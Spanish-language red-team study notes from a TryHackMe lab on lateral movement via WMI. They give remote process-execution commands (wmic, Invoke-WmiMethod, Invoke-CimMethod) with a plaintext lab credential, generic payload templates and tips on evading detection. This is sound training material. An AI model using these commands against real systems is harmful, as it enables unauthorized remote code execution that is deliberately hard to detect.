---
tags: [red-team, lateral-movement, wmi, powershell, dcom]
created: 2026-04-21
source: TryHackMe - Lateral Movement and Pivoting
related:
  - "[[Spawning Processes Remotely]]"
  - "[[Moving Through the Network]]"
---
**WMI (Windows Management Instrumentation)** es la interfaz de administración de Windows que opera sobre **DCOM (puerto 135 + puertos dinámicos)** o **WinRM (5985/5986)**. Permite ejecutar código remoto sin escribir en disco (mucho más sigiloso que PsExec).

---

## wmic.exe (legacy)

Ejecutar un proceso remoto:

```shell
wmic /node:TARGET /user:DOMAIN\admin /password:Password process call create "cmd.exe /c calc.exe"
```

Contra el objetivo de la room:

```shell
wmic /node:THMIIS.za.tryhackme.com /user:za.tryhackme.com\t1_corine.waters process call create "C:\Users\t1_corine.waters\Desktop\flag.exe > C:\Users\t1_corine.waters\Desktop\flag.txt"
```

> [!info] `wmic` está deprecado desde Windows 10 21H1 pero aún puede invocarse. Se reemplaza por PowerShell CIM cmdlets.

---

## PowerShell: Invoke-WmiMethod

```powershell
$username = 'za.tryhackme.com\t1_corine.waters'
$password = 'Coll1ngwood'
$secstr = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secstr

Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c C:\Users\t1_corine.waters\Desktop\flag.exe > C:\Users\t1_corine.waters\Desktop\flag.txt" `
    -ComputerName THMIIS.za.tryhackme.com `
    -Credential $cred
```

---

## PowerShell: Invoke-CimMethod (moderno)

```powershell
$Session = New-CimSession -ComputerName THMIIS.za.tryhackme.com -Credential $cred
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "cmd.exe /c payload.exe"}
```

> [!tip] CIM usa **WSMan (WinRM)** por defecto en lugar de DCOM, lo que lo hace más firewall-friendly y más silencioso en logs de DCOM.

---

## Comandos Clave

```shell
wmic /node:HOST /user:DOM\usr /password:pw process call create "cmd /c payload"
```

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c payload" -ComputerName HOST -Credential $cred
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd /c payload'} -CimSession $sess
```

---

## Ventajas vs PsExec

| Aspecto            | PsExec             | WMI                    |
| ------------------ | ------------------ | ---------------------- |
| Escribe en disco   | Sí (`PSEXESVC`)    | No                     |
| Crea servicio      | Sí (Event ID 7045) | No                     |
| Puertos            | 445                | 135 + dinámicos / 5985 |
| Detección          | Alta               | Media-baja             |
| Output interactivo | Sí                 | No (fire-and-forget)   |

> [!warning] WMI **no devuelve salida** del comando ejecutado. Hay que redirigir la salida a un archivo y leerlo, o usar un reverse shell.